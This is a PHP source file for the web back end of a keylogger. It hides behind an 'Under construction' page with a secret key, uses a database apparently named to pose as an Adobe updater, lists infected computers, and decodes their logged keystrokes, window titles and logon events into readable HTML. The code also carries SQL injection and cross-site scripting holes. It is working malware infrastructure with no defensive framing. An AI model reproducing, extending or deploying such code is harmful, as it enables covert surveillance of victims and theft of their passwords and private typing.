<?php

$authenticated = 0;

if (isset($_GET["key"]))
{
	if ($_GET["key"] == "xxxxxxxxx")
	{
		$authenticated = 1;
	}
}

if ($authenticated == 0)
{
	echo("Under construction");

	exit(0);
}	

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Under Construction</title>
<style type="text/css">
<!--
body,td,th {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #000000;
}
body {
	background-color: #E0E0E0;
}
.style1 {
	color: #000000;
	font-size: 16px;
	font-weight: bold;
}
a:link {
	color: #0000FF;
}
a:visited {
	color: #2000FF;
}
a:hover {
	color: #2020FF;
}
a:active {
	color: #4040FF;
}
.style2 {
	color: #000000;
	font-weight: bold;
}
-->
</style></head><body>

<?php

$codeMap = array(1 => "[Escape]", 2 => "1", 3 => "2", 4 => "3", 5 => "4", 6 => "5", 7 => "6", 8 => "7", 9 => "8", 10 => "9", 11 => "0",
                 12 => "-", 13 => "=", 14 => "[Backspace]", 15 => "[Tab]", 16 => "q", 17 => "w", 18 => "e", 19 => "r", 20 => "t", 21 => "y",
                 22 => "u", 23 => "i", 24 => "o", 25 => "p", 26 => "[", 27 => "]", 28 => "[Enter]<br/>", 29 => "[LeftControl]", 30 => "a", 31 => "s",
                 32 => "d", 33 => "f", 34 => "g", 35 => "h", 36 => "j", 37 => "k", 38 => "l", 39 => ";", 40 => "'", 41 => "`", 42 => "[LeftShift]",
                 43 => "\\", 44 => "z", 45 => "x", 46 => "c", 47 => "v", 48 => "b", 49 => "n", 50 => "m", 51 => ",", 52 => ".", 53 => "/",
                 54 => "[RightShift]", 55 => "*", 56 => "[LeftAlt]", 57 => " ", 58 => "[CapsLock]", 59 => "[F1]", 60 => "[F2]", 61 => "[F3]", 62 => "[F4]",
                 63 => "[F5]", 64 => "[F6]", 65 => "[F7]", 66 => "[F8]", 67 => "[F9]", 68 => "[F10]", 69 => "[Pause]", 70 => "[ScrollLock]", 71 => "7",
                 72 => "8", 73 => "9", 74 => "-", 75 => "4", 76 => "5", 77 => "6", 78 => "+", 79 => "1", 80 => "2", 81 => "3", 82 => "0",
                 83 => ".", 87 => "[F11]", 88 => "[F12]", 100 => "[F13]", 101 => "[F14]", 102 => "[F15]", 146 => ":", 147 => "_", 156 => "[Enter]<br/>",
                 157 => "[RightControl]", 179 => ",", 181 => "/", 184 => "[RightAlt]", 197 => "[NumLock]", 199 => "[Home]", 200 => "[Up]", 201 => "[PageUp]",
                 203 => "[Left]", 205 => "[Right]", 207 => "[End]", 208 => "[Down]", 209 => "[PageDown]", 210 => "[Insert]", 211 => "[Delete]", 219 => "[LeftWindows]",
                 220 => "[RightWindows]", 253 => "[Click]", 254 => "[RightClick]");

$shiftMap = array("q" => "Q", "w" => "W", "e" => "E", "r" => "R", "t" => "T", "y" => "Y", "u" => "U", "i" => "I", "o" => "O", "p" => "P",
                  "a" => "A", "s" => "S", "d" => "D", "f" => "F", "g" => "G", "h" => "H", "j" => "J", "k" => "K", "l" => "L",
                  "z" => "Z", "x" => "X", "c" => "C", "v" => "V", "b" => "B", "n" => "N", "m" => "M",
                  "`" => "~", "1" => "!", "2" => "@", "3" => "#", "4" => "$", "5" => "%", "6" => "^", "7" => "&", "8" => "*", "9" => "(", "0" => ")", "-" => "_", "=" => "+",
                  ";" => ":", "'" => '"', "," => "<", "." => ">", "/" => "?", "[" => "{", "]" => "}", "\\" => "|");


mysql_connect('localhost', 'AdobeUpdater', 'xxxxxxxxx')
	or die("Error");
   
mysql_select_db('adobeupdater')
	or die("Error");

$invalidRequest = 0;

if (isset($_GET["computer"])) $computerName = $_GET["computer"];
else $invalidRequest = 1;

if ($invalidRequest == 1)
{
	$query = 'SELECT computer,time FROM data ORDER BY time ASC';

	$results = mysql_query($query);
	
	echo("<h1>Computer List</h1>");

	$computers = array();

	while ($update = mysql_fetch_assoc($results))
	{
		$computers[$update['computer']] = $update['time'];
	}

	foreach ($computers as $computer => $time)
	{
		echo("<a href='view_data.php?key=xxxxxxxxx&computer=" . $computer . "'>" . $computer . "</a> - " . $time . "<br/>");
	}
}
else
{
	$query = 'SELECT data,time FROM data WHERE computer=\'' . $computerName . '\' ORDER BY time ASC LIMIT 1000';

	$results = mysql_query($query);
	
	echo("<h1>$computerName</h1>");

	$shifted = 0;

	while ($update = mysql_fetch_assoc($results))
	{
		echo('<h3>' . $update['time'] . '</h3>');

		$data = $update['data'];

		$vals = array();

		echo("<table style='border:1px solid #505050'><tr><td></td><td>");

		$row = 1;

		for ($i = 0; $i < strlen($data); $i += 2)
		{
			$high = $data[$i];
			$low  = $data[$i + 1];

			$val = hexdec($high . $low);
			
			$vals[] = $val;
		}

		for ($i = 0; $i < count($vals); $i++)
		{
			$val = $vals[$i];

			if (($val == 0) || ($val == 255)) // window event or logon event
			{
				$windowTitle = "";

				$i++;

				while ($vals[$i] != 0)
				{
					$windowTitle = $windowTitle . chr($vals[$i]);
					
					$i++;
				}

				if ($windowTitle == "") $windowTitle = "Untitled Window";

				if ($val == 255)
				{
					$windowTitle = "LOGON - " . $windowTitle;
					
					$shifted = 0;
				}

				if ($row == 1)
				{
					echo('</td></tr><tr style="background-color:#F8F8E0"><td style="font-weight:bold">[' . $windowTitle . "]</td><td>");
				}
				else
				{
					echo('</td></tr><tr><td style="font-weight:bold">[' . $windowTitle . "]</td><td>");
				}

				$row = 1 - $row;

			}
			elseif ($val == 252) // keyup event
			{
				$i++;

				if (($vals[$i] == 54) || ($vals[$i] == 42))
				{
					$shifted = 0;
				}
				
			}
			elseif (isset($codeMap[$val]))
			{
				$glyph = $codeMap[$val];

				if (($glyph == "[LeftShift]") || ($glyph == "[RightShift]"))
				{
					$shifted = 1;
				}
				else
				{
					if (($shifted == 1) && (isset($shiftMap[$glyph]))) $glyph = $shiftMap[$glyph];
					
					if (strlen($glyph) > 1) echo('<span style="color:#603030;font-size:80%;font-style:italic">' . $glyph . "</span>");
					else echo($glyph);
				}
			}
		}

		echo('</table>');
	}

	mysql_free_result($results);

}

?>

</body>
</html>
